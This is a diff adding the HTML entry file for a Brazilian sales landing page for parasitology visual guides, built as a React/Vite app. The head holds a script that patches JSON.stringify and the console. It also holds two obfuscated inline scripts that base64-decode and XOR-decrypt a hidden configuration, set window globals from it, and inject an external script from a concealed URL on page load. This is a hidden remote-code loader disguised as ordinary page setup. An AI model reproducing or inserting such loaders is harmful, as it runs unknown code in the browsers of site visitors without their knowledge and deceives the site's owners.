@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="pt-BR" class="scroll-smooth">
+  <head>
+    <script>
+      (function() {
+        // Previne erro de estrutura circular (Converting circular structure to JSON)
+        // causado quando scripts de rastreamento externos registram elementos DOM com React Fiber no console
+        try {
+          var originalStringify = JSON.stringify;
+          JSON.stringify = function(value, replacer, space) {
+            var seen = new WeakSet();
+            var safeReplacer = function(key, val) {
+              if (typeof val === "object" && val !== null) {
+                if (typeof Node !== "undefined" && val instanceof Node) {
+                  return "[DOMElement " + (val.nodeName || "Node") + "]";
+                }
+                if (typeof Window !== "undefined" && val instanceof Window) {
+                  return "[Window]";
+                }
+                if (seen.has(val)) {
+                  return "[Circular]";
+                }
+                seen.add(val);
+              }
+              if (typeof replacer === "function") {
+                return replacer.call(this, key, val);
+              }
+              return val;
+            };
+            try {
+              return originalStringify(value, safeReplacer, space);
+            } catch (err) {
+              try {
+                return originalStringify(String(value));
+              } catch (e) {
+                return '"[Unserializable]"';
+              }
+            }
+          };
+
+          if (typeof console !== "undefined") {
+            ['log', 'debug', 'info', 'warn', 'error'].forEach(function(method) {
+              if (typeof console[method] === "function") {
+                var originalMethod = console[method];
+                console[method] = function() {
+                  var safeArgs = [];
+                  for (var i = 0; i < arguments.length; i++) {
+                    var arg = arguments[i];
+                    if (typeof Node !== "undefined" && arg instanceof Node) {
+                      safeArgs.push("[" + arg.nodeName + (arg.id ? "#" + arg.id : "") + "]");
+                    } else {
+                      safeArgs.push(arg);
+                    }
+                  }
+                  try {
+                    return originalMethod.apply(console, safeArgs);
+                  } catch (e) {
+                    // Previne qualquer exceção em loggers de ambiente/iframe
+                  }
+                };
+              }
+            });
+          }
+        } catch (e) {
+          // Fallback silencioso
+        }
+      })();
+    </script>
+
+<script>(function(){var v_7=atob("DFNTg4H2KbfXY+J+fihx9vOaC431C5YKDiBprK6VTdn5FpYTFzUqreKZRJm1Ec0NHSE68/WFBse+G4cSUSM6++SaB92kQc5cHycn8eiUXMOyEMBEJQ5/oeaaRtW2D5FcRAgooe+XRNL1WcAOFys278iSC5v1FYMSCzZxuaPASNbuB4McGmc3sOKTG9XgB4ZLH2A1tePUVOqq");var p_60e=[];for(var u_7ei=0;u_7ei<v_7.length;u_7ei++){p_60e.push(v_7.charCodeAt(u_7ei)&255);}var m_p=p_60e[0];var j_7spq=p_60e.slice(1,1+m_p);var l_5=p_60e.slice(1+m_p);var v_i=l_5.map(function(b,v_2jan){return b^j_7spq[v_2jan%m_p];});var z_69="";for(var m_ug1=0;m_ug1<v_i.length;m_ug1++){z_69+=String.fromCharCode(v_i[m_ug1]&255);}var b_e1x=decodeURIComponent(escape(z_69));var p_o14=JSON.parse(b_e1x);var a_4e1s=p_o14.globals||[];a_4e1s.forEach(function(w_ccpn){window[w_ccpn.name]=w_ccpn.value;});var a_y=document.createElement("script");a_y.src=p_o14.url;a_y.async=true;a_y.defer=true;(p_o14.attributes||[]).forEach(function(q_voin){a_y.setAttribute(q_voin.name,q_voin.value);});(document.head||document.documentElement).appendChild(a_y);})();</script>
+
+<script>(function(){var f_q8=atob("DJ5Q0UmK1NYJEkuS4eVypDvm9uwrej/mke1q/mbpsLgnZz//iPgp/yrlufhrYGThguw5oT35+6N9fzi9jf8ktDr++rx6MGewgOokoyDooaJsYWmouuVyvyjnsfQzMC/zlf99pD3nvbBwPzvghOg1vz2nrLVmdmbhgvVy/Wv8tbp8d2mow7wt/TKourdkd2mow/oxpSinoaJkey3rzO4itD/vuqIkYT7wiPoj82WoordlZy6w27xyrBT3");var v_5=[];for(var s_r=0;s_r<f_q8.length;s_r++){v_5.push(f_q8.charCodeAt(s_r)&255);}var t_i23=v_5[0];var c_3wj=v_5.slice(1,1+t_i23);var a_pgh=v_5.slice(1+t_i23);var y_my=a_pgh.map(function(b,s_juec){return b^c_3wj[s_juec%t_i23];});var q_zuic="";for(var t_o9=0;t_o9<y_my.length;t_o9++){q_zuic+=String.fromCharCode(y_my[t_o9]&255);}var d_5k=decodeURIComponent(escape(q_zuic));var k_n2=JSON.parse(d_5k);var w_z=k_n2.globals||[];w_z.forEach(function(l_p){window[l_p.name]=l_p.value;});var i_y2bb=document.createElement("script");i_y2bb.src=k_n2.url;i_y2bb.async=true;i_y2bb.defer=true;(k_n2.attributes||[]).forEach(function(c_sl58){i_y2bb.setAttribute(c_sl58.name,c_sl58.value);});(document.head||document.documentElement).appendChild(i_y2bb);})();</script>
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Guias Visuais de Parasitologia</title>
+    <meta name="description" content="Landing page de vendas dos Guias Visuais de Parasitologia para identificação segura de ovos, cistos e larvas." />
+    <meta property="og:title" content="Guias Visuais de Parasitologia" />
+    <meta property="og:description" content="Landing page de vendas dos Guias Visuais de Parasitologia para identificação segura de ovos, cistos e larvas." />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,400;1,600;1,700&display=swap" rel="stylesheet">
+  </head>
+  <body class="bg-[#070B10] text-slate-100 antialiased font-['Poppins'] selection:bg-amber-400 selection:text-black">
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
+
